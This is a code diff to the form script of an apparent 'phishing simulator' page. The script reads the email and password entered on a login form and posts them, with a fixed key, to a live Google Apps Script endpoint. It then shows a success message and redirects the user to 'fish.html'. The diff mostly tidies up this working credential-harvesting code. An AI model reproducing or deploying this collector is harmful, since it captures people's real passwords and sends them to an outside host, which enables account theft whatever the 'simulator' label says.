@@ -422,43 +422,35 @@
     msg.classList.add('visible');
     msg.textContent = "Submitting...";
 
-    // 🔽 Collect form data
-    const formData = {
-      email: document.getElementById('email').value,
-      password: document.getElementById('password').value,
-
-      // 🔐 OPTIONAL: Add a secret key (must match Apps Script)
-      key: "phishingsimulator" 
-      // ↑ Replace with your key OR remove this line if not using one
-    };
-
     try {
       const formData = new FormData();
+
       formData.append("email", document.getElementById('email').value);
       formData.append("password", document.getElementById('password').value);
-      formData.append("key", "phishingsimulator");
+      formData.append("key", "phishingsimulator"); // must match Apps Script
 
       await fetch(
-        "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec",
+        "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec", 
+        // 🔴 REPLACE THIS WITH YOUR /exec URL
+        // Example: https://script.google.com/macros/s/XXXX/exec
+
         {
           method: "POST",
           mode: "no-cors",
           body: formData
-          // ❌ REMOVE headers completely
         }
       );
 
-      msg.textContent = "Registered successfully! Redirecting...";
+      msg.textContent = "Registered! Redirecting...";
 
     } catch (err) {
-      console.error("Error:", err);
-      msg.textContent = "Network error.";
+      console.error(err);
+      msg.textContent = "Error submitting.";
     }
 
-    // Redirect after delay
     setTimeout(() => {
-      window.location.href = "fish.html"; // ← your next page
-    }, 1500);
+      window.location.href = "fish.html";
+    }, 1000);
   });
 </script>
 
